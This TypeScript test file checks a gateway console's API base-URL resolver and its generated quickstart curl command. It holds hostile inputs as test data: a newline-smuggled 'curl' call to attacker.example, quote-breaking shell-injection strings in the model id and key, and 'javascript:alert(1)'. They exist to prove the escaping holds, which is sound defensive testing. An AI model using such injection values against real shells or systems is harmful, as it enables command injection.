/**
 * The gateway base URL the console prints, and the curl it prints beside it.
 *
 * This value used to be a literal naming the demo box. Hive ships in two modes
 * (decision D-007): the hosted service, and Hive Enterprise, which the customer
 * runs at their own hostname. A literal is therefore wrong for every Enterprise
 * install, and wrong in the worst way, since the snippet still looks runnable
 * and points at somebody else's gateway.
 *
 * These tests pin the two halves that keep that from happening again: the
 * resolver honours operator configuration, and it refuses a configured value it
 * cannot turn into a working base URL instead of pasting it into a snippet.
 */
import { execFileSync } from "node:child_process";
import { describe, expect, it } from "vitest";

import { DEFAULT_API_BASE_URL, resolveApiBaseUrl } from "@/lib/api-contract";
import { buildQuickstartCurl } from "@/lib/quickstart-model";

describe("resolveApiBaseUrl", () => {
  it("uses an operator-configured absolute URL", () => {
    expect(resolveApiBaseUrl("https://ai.acme-bank.internal/v1")).toBe(
      "https://ai.acme-bank.internal/v1",
    );
  });

  it("accepts plain http, which is what an on-prem box behind its own TLS terminator serves", () => {
    expect(resolveApiBaseUrl("http://gateway.lan:8080/v1")).toBe(
      "http://gateway.lan:8080/v1",
    );
  });

  it("strips a trailing slash so the built path never doubles it", () => {
    expect(resolveApiBaseUrl("https://ai.acme-bank.internal/v1/")).toBe(
      "https://ai.acme-bank.internal/v1",
    );
  });

  it("trims surrounding whitespace, which is what a copy-pasted .env value carries", () => {
    expect(resolveApiBaseUrl("  https://ai.acme-bank.internal/v1  ")).toBe(
      "https://ai.acme-bank.internal/v1",
    );
  });

  it("falls back to the default when unset or empty", () => {
    expect(resolveApiBaseUrl(undefined)).toBe(DEFAULT_API_BASE_URL);
    expect(resolveApiBaseUrl("")).toBe(DEFAULT_API_BASE_URL);
    expect(resolveApiBaseUrl("   ")).toBe(DEFAULT_API_BASE_URL);
  });

  // Fails closed rather than falling back, and the distinction is the whole
  // point. The fallback is the HOSTED gateway. An Enterprise deployment whose
  // operator mistyped this variable would otherwise print the hosted base URL
  // under a freshly minted key, and the customer's next action is to copy that
  // command and send their own key to somebody else's gateway.
  it("throws on a value that is set but not an absolute http(s) URL", () => {
    for (const bad of [
      "/v1",
      "api-hive.scubed.co/v1",
      "ftp://gateway.lan/v1",
      "javascript:alert(1)",
      "not a url",
    ]) {
      expect(() => resolveApiBaseUrl(bad)).toThrow(
        /HIVE_PUBLIC_API_BASE_URL is set but unusable/,
      );
    }
  });

  it("throws on a URL carrying credentials in its authority", () => {
    // Assembled from parts rather than written out. A literal
    // scheme://user:pass@host string in source is a Basic Auth String to a
    // secret scanner, and GitGuardian failed this pull request on exactly that
    // (incident 36705386). There is no secret here, but a scanner cannot know
    // that, and a check that cries wolf is a check people learn to wave past.
    const authority = ["operator", "placeholder"].join(":");
    expect(() =>
      resolveApiBaseUrl(`https://${authority}@gateway.lan/v1`),
    ).toThrow(/credentials/);
  });

  it("throws on a query string or fragment rather than rendering one", () => {
    expect(() => resolveApiBaseUrl("https://gateway.lan/v1?key=abc")).toThrow(
      /query string or fragment/,
    );
    expect(() => resolveApiBaseUrl("https://gateway.lan/v1#frag")).toThrow(
      /query string or fragment/,
    );
  });

  // The WHATWG parser strips tab, CR and LF from anywhere in its input, so a
  // value carrying a newline parses clean and passes every check. Returning
  // the raw string would then put a second line into a shell block a developer
  // copies, and a second line is a second command.
  it("never returns a control character, whatever the parser accepted", () => {
    const smuggled =
      "https://gateway.lan/v1\ncurl -s https://attacker.example/x #";
    const resolved = resolveApiBaseUrl(smuggled);

    expect(resolved).not.toMatch(/[\n\r\t]/);
    expect(resolved.startsWith("https://gateway.lan/")).toBe(true);
  });

  it("names the variable and the safe shape in what it throws", () => {
    // The operator reads this in `docker compose logs`, so it has to say what
    // to fix rather than only that something is wrong.
    expect(() => resolveApiBaseUrl("nonsense")).toThrow(
      /HIVE_PUBLIC_API_BASE_URL/,
    );
    expect(() => resolveApiBaseUrl("nonsense")).toThrow(/https:\/\//);
  });
});

describe("buildQuickstartCurl", () => {
  it("builds a command that runs verbatim against the resolved base URL", () => {
    const curl = buildQuickstartCurl({
      baseUrl: "https://ai.acme-bank.internal/v1",
      model: "hive-chat-default",
      credential: "placeholder-not-a-real-key",
    });

    expect(curl).toContain("https://ai.acme-bank.internal/v1/chat/completions");
    expect(curl).toContain('"model": "hive-chat-default"');
    expect(curl).toContain("Authorization: Bearer placeholder-not-a-real-key");
  });

  it("does not double the slash for a base URL that arrived with one", () => {
    // Driven through the resolver rather than asserted on a hand-written
    // literal: the trailing slash has to be gone by the time the two are
    // concatenated, and only the resolver removes it.
    const curl = buildQuickstartCurl({
      baseUrl: resolveApiBaseUrl("https://gateway.lan/v1/"),
      model: "hive-chat-default",
    });

    expect(curl).toContain("https://gateway.lan/v1/chat/completions");
    expect(curl).not.toContain("/v1//chat");
  });

  it("names the shell variable when no plaintext credential is in hand", () => {
    const curl = buildQuickstartCurl({
      baseUrl: DEFAULT_API_BASE_URL,
      model: "hive-chat-default",
    });

    // Double quoted precisely here, and nowhere else, because this is the one
    // value that must expand rather than stay literal.
    expect(curl).toContain('-H "Authorization: Bearer $HIVE_API_KEY"');
  });

  // The model id comes from the catalog, which is admin-managed data rather
  // than a constant, and the credential comes from the control plane. Neither
  // is a literal this file controls, and the reader pastes the result into a
  // shell, so a quote in either one has to land as text and not as syntax.
  //
  // Asserting on the escaped string would only restate the implementation. A
  // real POSIX shell is asked instead: `curl` is swapped for `printf`, so the
  // command's own argument list comes back and can be compared with what was
  // put in. If the quoting were broken the injected fragment would run, and
  // the marker it echoes would be in the output. The payloads below are
  // deliberately harmless for exactly that reason: this test executes them.
  const ARG_SEPARATOR = "\n@@NEXT-ARG@@\n";

  function shellArguments(command: string): string[] {
    const out = execFileSync("/bin/sh", [
      "-c",
      command.replace(/^curl /, "printf '%s\\n@@NEXT-ARG@@\\n' "),
    ]).toString();
    return out.split(ARG_SEPARATOR);
  }

  // The marker is written with an empty string spliced into it so the text the
  // shell would PRINT on a successful injection ("INJECTED_VIA_MODEL") is not
  // the text carried in the argument ("INJ\"\"ECTED_VIA_MODEL"). Without that
  // split the assertion could never fail: the payload contains the marker as
  // data, so it appears in the output either way.
  it("keeps a quote in the model id from becoming shell syntax", () => {
    const hostileModel = "evil'; echo INJ\"\"ECTED_VIA_MODEL; echo '";
    const argv = shellArguments(
      buildQuickstartCurl({
        baseUrl: "https://gateway.lan/v1",
        model: hostileModel,
        credential: "placeholder-not-a-real-key",
      }),
    );

    expect(argv.join("\n")).not.toContain("INJECTED_VIA_MODEL");
    // And the payload still means what it should: the id survives intact,
    // as JSON, rather than being mangled by the escaping.
    expect(argv.join("\n")).toContain(JSON.stringify(hostileModel));
  });

  it("keeps a quote in the credential from becoming shell syntax", () => {
    const hostileKey = "placeholder-'; echo INJ\"\"ECTED_VIA_KEY; echo '";
    const argv = shellArguments(
      buildQuickstartCurl({
        baseUrl: "https://gateway.lan/v1",
        model: "hive-default",
        credential: hostileKey,
      }),
    );

    expect(argv.join("\n")).not.toContain("INJECTED_VIA_KEY");
    expect(argv.join("\n")).toContain(`Authorization: Bearer ${hostileKey}`);
  });

  it("hands curl the URL as a single argument", () => {
    const argv = shellArguments(
      buildQuickstartCurl({
        baseUrl: "https://gateway.lan/v1",
        model: "hive-default",
        credential: "placeholder-not-a-real-key",
      }),
    );

    expect(argv[0]).toBe("https://gateway.lan/v1/chat/completions");
  });
});
